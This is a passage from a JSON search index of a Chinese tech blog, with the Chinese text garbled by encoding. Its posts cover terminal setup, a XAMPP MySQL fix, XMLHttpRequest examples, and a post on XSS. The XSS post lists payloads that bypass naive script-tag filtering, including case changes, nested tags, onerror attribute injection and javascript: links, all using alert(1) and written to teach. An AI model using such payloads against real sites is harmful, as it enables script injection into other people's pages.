æ²’éŒ¯ï¼Œå°±æ˜¯é€™éº¼ç°¡å–®åˆæš´åŠ›çš„ç­”æ¡ˆã€‚","link":"/2022/03/04/why-webpack/"},{"title":"Windows çµ‚ç«¯é…ç½® æ‡¶äººåŒ…","text":"è¨˜èµ·ä¾†æ–¹ä¾¿ä¸‹æ¬¡ä½¿ç”¨ã€‚ åƒè€ƒæ•™å­¸ï¼šMake Windows Terminal Look Better | Oh My Posh Guide è¦å®‰è£çš„æ±è¥¿ å®‰è£ windows ternimal å®‰è£ä½ å–œæ­¡çš„ themes å®‰è£ä½ å–œæ­¡çš„ fonts å®‰è£ oh my poshï¼ˆä¸€å€‹ windows ternimal çš„æ’ä»¶ï¼‰ windows ternimal åŸºæœ¬è¨­å®šåŸºæœ¬çš„å­—å‹ã€ä¸»é¡Œå¯ä»¥åœ¨ã€Œé è¨­å€¼ &gt; å¤–è§€ã€çš„åœ°æ–¹è¨­å®šï¼š ä¹Ÿå¯ä»¥é»é¸å·¦ä¸‹è§’çš„ã€Œé–‹å•Ÿ JSON æª”æ¡ˆã€ä¾†é€é .json ä¾†è¨­å®šï¼Œä¾‹å¦‚ï¼š 12345678910\"profiles\": { \"defaults\": { \"backgroundImage\": null, // èƒŒæ™¯åœ–ç‰‡ \"colorScheme\": \"Dracula\", // ä¸»é¡Œ \"font\": { \"face\": \"JetBrainsMono Nerd Font\", // å­—å‹ \"size\": 10.0 // å­—é«”å¤§å° } }} å…¶ä»–çš„éƒ¨åˆ†å¯ä»¥è‡ªè¡Œæ‰¾å‡ºå°æ‡‰çš„ key ä¾†è¨­å®šã€‚ è¨­å®š oh my posh ä¸»é¡Œ åŸ·è¡Œ Get-PoshThemes æˆ–ç›´æ¥åˆ° å®˜ç¶² æŒ‘ä¸€å€‹å–œæ­¡çš„ä¸»é¡Œ æ‹¿åˆ°è¨­å®šä¸»é¡Œçš„æŒ‡ä»¤ï¼Œé€šå¸¸æœƒé•·å¾—åƒé€™æ¨£ï¼šoh-my-posh init pwsh --config 'C:\\Users\\user\\AppData\\Local\\Programs\\oh-my-posh\\themes\\&lt;ä¸»é¡Œåç¨±&gt;.omp.json' | Invoke-Expression åŸ·è¡Œ notepad $PROFILE æ‰“é–‹ shell çš„è¨­å®šæª”ï¼Œå†æŠŠç¬¬äºŒæ­¥çš„æŒ‡ä»¤è²¼é€²ã€‚ï¼ˆå¦‚æœå‡ºç¾éŒ¯èª¤ï¼Œä»£è¡¨ä½ å¯èƒ½é‚„æ²’æœ‰é€™å€‹æª”æ¡ˆï¼Œè«‹å…ˆåŸ·è¡Œ New-Item -Path $PROFILE -Type File -Forceï¼‰ å®Œæˆä¸Šé¢æ­¥é©Ÿå¾Œï¼Œå¦‚æœé‡æ–°æ‰“é–‹æœ‰æ­£ç¢ºé¡¯ç¤ºå°±ä»£è¡¨æˆåŠŸäº†ã€‚ å®‰è£ Git ç›¸é—œæ’ä»¶å¦‚æœæ˜¯ä½ ç”¨çš„ shell æ˜¯ã€ŒPowerShellã€çš„è©±ï¼Œåœ¨ä½¿ç”¨ git æŒ‡ä»¤æ™‚ç”¨ tab ä¸æœƒåƒ git bash ä¸€æ¨£æœ‰ autocomplete çš„åŠŸèƒ½ï¼Œæ‰€ä»¥æˆ‘åƒè€ƒäº†é€™ç¯‡ æ–‡ç«  ä¾†è§£æ±ºé€™å•é¡Œã€‚ é¦–å…ˆåœ¨çµ‚ç«¯ä¸­åŸ·è¡Œï¼š 1PowerShellGet\\Install-Module posh-git -Scope CurrentUser -Force æ¥è‘—åˆ°è¨­å®šæª”ï¼ˆå¯ä»¥ç”¨ $PROFILE ä¾†æŸ¥çœ‹ä½ç½®ï¼‰ä¸­åŠ å…¥åº•ä¸‹é€™æ®µå°±å¯ä»¥äº†ï¼š 1Import-Module posh-git","link":"/2023/06/10/windows-terminal-set-up/"},{"title":"ç•¶ XAMPP çš„ MySQL çˆ†æ‰è©²æ€éº¼è™•ç†","text":"æ€•ä¹‹å¾Œåˆè¸©åˆ°é€™å€‹é›· ç°¡è¿°æŸå¤©è¦é€£ç·š MySQL çš„æ™‚å€™å°±å™´éŒ¯èª¤è¨Šæ¯ï¼š ä»¥ä¸‹çš„æ–¹æ³•æˆ‘éƒ½è©¦éï¼Œä½†éƒ½æ²’æˆåŠŸï¼š How to Fix the XAMPP Error â€œMySQL Shutdown Unexpectedlyâ€ (3 Methods) How to solve â€œError: MySQL shutdown unexpectedlyâ€? ä½†æœ‰éœ€è¦çš„è©±é‚„æ˜¯å¯ä»¥åƒè€ƒä¸€ä¸‹ã€‚ è§£æ±ºè¾¦æ³• æŠŠ xampp/mysql/data è³‡æ–™å¤¾æ•´å€‹è³‡æ–™å¤¾è¤‡è£½ä¸€ä»½ =&gt; xampp/mysql/data-è¤‡è£½ æŠŠ xampp/mysql/backup çš„å…§å®¹å…¨éƒ¨è²¼åˆ° xampp/mysql/data æŠŠ xampp/mysql/data-è¤‡è£½ çš„å…§å®¹å…¨éƒ¨è²¼åˆ° xampp/mysql/dataï¼Œé™¤äº† mysql performance_schema phpmyadmin é€™å¹¾å€‹è³‡æ–™å¤¾ å¦‚æœæœ€å¾Œ MySQL å¯ä»¥é€£ç·šï¼Œä½†é‚„æ˜¯è®€ä¸åˆ°åŸæœ¬çš„è³‡æ–™ï¼Œå†æŠŠ xampp/mysql/data-è¤‡è£½ è£¡é¢çš„ ibdata1 è²¼åˆ° xampp/mysql/dataï¼ˆé€™å€‹æª”æ¡ˆå¾ˆé‡è¦ï¼Œæˆ‘å°±æ˜¯é€™æ¨£å¾©åŸçš„ï¼‰ é—œæ–¼ç¬¬å››å€‹æ­¥é©Ÿæˆ‘æ˜¯çœ‹é€™ç¯‡æ‰è§£å‡ºä¾†çš„ï¼šMariaDB (MySQL)å‡ºç¾table doesnâ€™t exist in engineéŒ¯èª¤","link":"/2022/02/10/xampp-problem-fix/"},{"title":"XMLHttpRequest çš„å¯«æ³•","text":"è¦ºå¾—å¤ªä¹…æ²’å¯«çš„è©±åˆæœƒå¿˜è¨˜å®ƒçš„å¯«æ³•ã€‚ ç°¡è¿°é€™é‚Šæ˜¯ç”¨é€™æ”¯ API ä¾†åšç¤ºç¯„ã€‚ GETç°¡å–®ä¾†èªªé †åºä¸€å®šæ˜¯é€™æ¨£ï¼š å»ºç«‹ XHR å¯¦é«” æ‰“é–‹è¦è«‹æ±‚çš„ end point è¨­å®šæ‹¿åˆ°å›æ‡‰çš„ callback ç™¼é€ request å¤±æ•—çš„ callback é€å‡º request 1&lt;button&gt;Send request&lt;/button&gt; 1234567891011121314151617181920212223242526272829303132function sendRequest(url, callback) { // å»ºç«‹ xhr å¯¦é«” const request = new XMLHttpRequest() // è¨­å®š end point è·Ÿ HTTP method request.open('GET', url, true) // æœ‰éœ€è¦åŠ ä¸Š header çš„è©± request.setRequestHeader('client-id', 'xxxxxx') // è«‹æ±‚æˆåŠŸçš„ callback request.onload = () =&gt; { if (request.status &gt;= 200 &amp;&amp; request.status &lt; 400) { callback(null, request.responseText) } else { callback('We reached our target server, but it returned an error') } } // è«‹æ±‚å¤±æ•—çš„ callback request.onerror = () =&gt; { callback('There was a connection error of some sort') } // é€å‡ºè«‹æ±‚ request.send()}// æŒ‰ä¸‹æŒ‰éˆ•å°±ç™¼ä¸€å€‹ requestconst URL = 'https://gorest.co.in/public/v1/users'const button = document.querySelector('button')button.onclick = () =&gt; { sendRequest(URL) .then(data =&gt; console.log(JSON.parse(data))) .catch(err =&gt; console.log(err)) } å‚™è¨»ï¼šonerror çš„å®šç¾©æ˜¯ä½ é€£ request éƒ½æ²’æœ‰é€å‡ºå»ï¼Œä¼ºæœå™¨æ ¹æœ¬æ²’æ”¶åˆ°çš„æ„æ€ã€‚ POSTè·Ÿå‰›å‰›å·®ä¸å¤šï¼Œä½†è¦æ³¨æ„ POST çš„è³‡æ–™æ ¼å¼ï¼š application/json JSON application/x-www-form-urlencoded Form é€™é‚Šç¤ºç¯„ JSONï¼š 12345678910111213141516171819202122232425262728293031323334353637function sendRequest(url) { return new Promise((resolve, reject) =&gt; { // è¦å‚³é€çš„ JSON è³‡æ–™ const params = { email: 'aaa123456@gmail.com', gender: 'male', name: 'Jacky', status: 'active' } const request = new XMLHttpRequest() request.open('POST', url, true) request.setRequestHeader('Content-type', 'application/json') request.setRequestHeader('Authorization', 'Bearer xxxxx') request.onload = () =&gt; { if (request.status &gt;= 200 &amp;&amp; request.status &lt; 400) { resolve(request.responseText) } else { reject('We reached our target server, but it returned an error') } } request.onerror = () =&gt; { reject('There was a connection error of some sort') } // æœ€å¾Œè¦è¨˜å¾—è½‰æˆå­—ä¸² request.send(JSON.stringify(params)) })}// æŒ‰ä¸‹æŒ‰éˆ•å°±ç™¼ä¸€å€‹ requestconst URL = 'https://gorest.co.in/public/v1/users'const button = document.querySelector('button')button.onclick = () =&gt; { sendRequest(URL) .then(data =&gt; console.log(JSON.parse(data))) .catch(err =&gt; console.log(err)) } Form è¡¨å–®ï¼š 12345678910111213141516171819202122232425262728293031function sendRequest(url) { return new Promise((resolve, reject) =&gt; { const request = new XMLHttpRequest() request.open('POST', url, true) // è¨˜å¾—è³‡æ–™æ ¼å¼è¦å¡«å° request.setRequestHeader('Content-type', 'application/x-www-form-urlencoded; charset=UTF-8') request.setRequestHeader('Authorization', 'Bearer xxxxx') request.onload = () =&gt; { if (request.status &gt;= 200 &amp;&amp; request.status &lt; 400) { resolve(request.responseText) } else { reject('We reached our target server, but it returned an error') } } request.onerror = () =&gt; { reject('There was a connection error of some sort') } // ç”¨ queryString çš„æ ¼å¼ä¾†é€è³‡æ–™ request.send('email=bbb123456@gmail.com&amp;gender=male&amp;name=Jacky&amp;status=active') })}// æŒ‰ä¸‹æŒ‰éˆ•å°±ç™¼ä¸€å€‹ requestconst URL = 'https://gorest.co.in/public/v1/users'const button = document.querySelector('button')button.onclick = () =&gt; { sendRequest(URL) .then(data =&gt; console.log(JSON.parse(data))) .catch(err =&gt; console.log(err)) } æˆ–å…¶å¯¦ä¹Ÿå¯ä»¥ç”¨ FormData ä¾†è¨­å®šè³‡æ–™ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940function sendRequest(url) { return new Promise((resolve, reject) =&gt; { let form = new FormData() form.append('email', 'apple123456@gmail.com') form.append('gender', 'male') form.append('name', 'yoyo') form.append('status', 'active') /* è¦æª¢æŸ¥å…§å®¹å¾—é€™æ¨£çœ‹ */ /* for (var [key, value] of data.entries()) { // console.log(key, value); } */ const request = new XMLHttpRequest() request.open('POST', url, true) request.setRequestHeader('Authorization', 'Bearer xxxx') request.onload = () =&gt; { if (request.status &gt;= 200 &amp;&amp; request.status &lt; 400) { resolve(request.responseText) } else { reject('We reached our target server, but it returned an error') } } request.onerror = () =&gt; { reject('There was a connection error of some sort') } // æœ€å¾ŒæŠŠå»ºç«‹å¥½çš„ form é€å‡ºå» request.send(form) })}const URL = 'https://gorest.co.in/public/v1/users/'const button = document.querySelector('button')button.onclick = () =&gt; { sendRequest(URL) .then(data =&gt; console.log(JSON.parse(data))) .catch(err =&gt; console.log(err)) } å‚™è¨»ï¼šæˆ‘é€™é‚Šå¯¦æ¸¬æœƒæ‹¿åˆ° 422 ï¼ˆPOST å…§å®¹ä¸å°ï¼‰éŒ¯èª¤ï¼Œä½†æˆ‘ç¢ºèªéæ ¼å¼æ²’éŒ¯å‘€ã€‚ç¸½ä¹‹å‘¢ï¼ŒçŸ¥é“èƒ½é€™æ¨£ç”¨å°±å¥½ã€‚ è£œå……ï¼šç‚ºä»€éº¼æœƒå¤±æ•—ï¼Ÿ å› ç‚ºé€™ä¸€æ®µï¼š 1request.setRequestHeader('Content-type', 'application/x-www-form-urlencoded') å¦‚æœè¦ç”¨ FormData ä¾†åŒ…è£è¡¨å–®ï¼Œxhr æœƒè‡ªå·±å¹«ä½ è¨­å®šæ­£ç¢ºçš„ Content-typeï¼Œä½†å¦‚æœæˆ‘å€‘è‡ªå·±åˆåŠ ä¸Š header çš„è©±æœƒæŠŠåŸæœ¬çš„çµ¦è¦†å¯«æ‰ï¼Œæ‰€ä»¥åªè¦æ‹¿æ‰é‚£ä¸€æ®µå°± OK äº†ã€‚","link":"/2022/01/29/xhr-usage/"},{"title":"ä½ æƒ³ä¸åˆ°çš„ XSS æ”»æ“Šæ–¹å¼","text":"æƒ³ä¸åˆ°å§ï¼Ÿ ç°¡è¿°é€™æ˜¯åœ¨åšå®Œ ç¶²ç«™å‰å¾Œç«¯é–‹ç™¼åŸºç¤æ¸¬è©¦ å¾Œå­¸åˆ°çš„ä¸€äº›å°çŸ¥è­˜ï¼Œæ‰€ä»¥æƒ³è¨˜éŒ„ä¸€ä¸‹ã€‚ åªéæ¿¾ &lt;script&gt; å­—ä¸²å®‰å…¨å—ï¼Ÿä¸å®‰å…¨ã€‚ æˆ‘å¯ä»¥æ”¹ç”¨ &lt;SCRIPT ä¾†é¿é–‹ï¼ˆHTML æ²’æœ‰åˆ†å¤§å°å¯«ï¼‰ 12345&lt;?php $xss = '&lt;SCRIPT&gt;alert(1)&lt;/SCRIPT&gt;';?&gt;&lt;div&gt;&lt;?php echo str_replace('&lt;script&gt;', '', $xss); ?&gt;&lt;/div&gt; æˆ‘å¯ä»¥æ‹†æˆ &lt;scr&lt;script&gt;ipt&gt; 12345&lt;?php $xss = '&lt;scr&lt;script&gt;ipt&gt;alert(1)&lt;/scr&lt;script&gt;ipt&gt;';?&gt;&lt;div&gt;&lt;?php echo str_replace('&lt;script&gt;', '', $xss); ?&gt;&lt;/div&gt; æˆ‘å¯ä»¥å¯«æˆ &lt;script type=\"text/javascript\"&gt; 12345&lt;?php $xss = '&lt;script type=\"text/javascript\"&gt;alert(1)&lt;/script&gt;';?&gt;&lt;div&gt;&lt;?php echo str_replace('&lt;script&gt;', '', $xss); ?&gt;&lt;/div&gt; æˆ‘å¯ä»¥åˆ©ç”¨ã€Œå­—ä¸²æ‹¼æ¥ã€çš„æ–¹å¼å–ä»£ &lt;script&gt;ï¼ˆè·Ÿ SQL Injection é¡ä¼¼ï¼‰ 1234&lt;?php $xss = ' \" onerror=\"alert(1)';?&gt;&lt;img src=\"src\" alt=\"&lt;?php echo $xss; ?&gt;\"&gt; å¯æƒ¡ï¼Œé‚£æˆ‘æŠŠå¯ç–‘å­—å…ƒéƒ½éæ¿¾æ‰ç¸½å®‰å…¨äº†å§ï¼Ÿä¸å¥½æ„æ€ï¼Œæœ‰å€‹æ±è¥¿å«åšã€ŒJavaScript pseudo-protocolã€ï¼Œæ‰€ä»¥ä¸éœ€è¦é‚£äº›å­—å…ƒä¹Ÿèƒ½åŸ·è¡Œ JSã€‚ 12345&lt;?php $xss = 'javascript: alert(1)';?&gt;// é»ä¸‹å»é‚„æ˜¯æœƒè§¸ç™¼ xss&lt;a href=\"&lt;?php echo htmlspecialchars($xss); ?&gt;\"&gt;Good Things&lt;/a&gt; å¥½ï¼Œç›®å‰æˆ‘çŸ¥é“çš„å°±é€™äº›ï¼Œå…¶ä»–ç­‰ä¹‹å¾Œç¢°åˆ°äº†å†å›ä¾†è£œã€‚ä¸å¾—ä¸èªª XSS çš„æ”»æ“Šæ–¹å¼çœŸçš„æœ‰å¤ å¤šâ€¦","link":"/2022/03/15/you-dont-know-xss/"}],"tags":[],"categories":[{"name":"CSS","slug":"CSS","link":"/categories/CSS/"},{"name":"Eleventy","slug":"Eleventy","link":"/categories/Eleventy/"},{"name":"Example","slug":"Example","link":"/categories/Example/"},{"name":"React","slug":"React","link":"/categories/React/"},{"name":"Network","slug":"Network","link":"/categories/Network/"},{"name":"PHP","slug":"PHP","link":"/categories/PHP/"},{"name":"JavaScript","slug":"JavaScript","link":"/categories/JavaScript/"},{"name":"Node.js","slug":"Node-js","link":"/categories/Node-js/"},{"name":"Antd","slug":"Antd","link":"/categories/Antd/"},{"name":"Plug-in","slug":"Plug-in","link":"/categories/Plug-in/"},{"name":"Information-security","slug":"Information-security","link":"/categories/Information-security/"},{"name":"Algorithm","slug":"Algorithm","link":"/categories/Algorithm/"},{"name":"Bootstrap","slug":"Bootstrap","link":"/categories/Bootstrap/"},{"name":"HTML","slug":"HTML","link":"/categories/HTML/"},{"name":"MySQL","slug":"MySQL","link":"/categories/MySQL/"},{"name":"devtool","slug":"devtool","link":"/categories/devtool/"},{"name":"Command-line","slug":"Command-line","link":"/categories/Command-line/"},{"name":"English","slug":"English","link":"/categories/English/"},{"name":"VS-code","slug":"VS-code","link":"/categories/VS-code/"},{"name":"Next","slug":"Next","link":"/categories/Next/"},{"name":"Git","slug":"Git","link":"/categories/Git/"},{"name":"Programming","slug":"Programming","link":"/categories/Programming/"},{"name":"Computer-science","slug":"Computer-science","link":"/categories/Computer-science/"},{"name":"MindSet","slug":"MindSet","link":"/categories/MindSet/"},{"name":"Express","slug":"Express","link":"/categories/Express/"},{"name":"Firebase","slug":"Firebase","link":"/categories/Firebase/"},{"name":"Shell-script","slug":"Shell-script","link":"/categories/Shell-script/"},{"name":"Heroku","slug":"Heroku","link":"/categories/Heroku/"},{"name":"Others","slug":"Others","link":"/categories/Others/"},{"name":"jQuery","slug":"jQuery","link":"/categories/jQuery/"},{"name":"mentor-program","slug":"mentor-program","link":"/categories/mentor-program/"},{"name":"Vim","slug":"Vim","link":"/categories/Vim/"},{"name":"NPM","slug":"NPM","link":"/categories/NPM/"},{"name":"React Native","slug":"React-Native","link":"/categories/React-Native/"},{"name":"Testing","slug":"Testing","link":"/categories/Testing/"},{"name":"RegExp","slug":"RegExp","link":"/categories/RegExp/"},{"name":"ORM","slug":"ORM","link":"/categories/ORM/"},{"name":"Book","slug":"Book","link":"/categories/Book/"},{"name":"TypeScript","slug":"TypeScript","link":"/categories/TypeScript/"},{"name":"Vue","slug":"Vue","link":"/categories/Vue/"}]}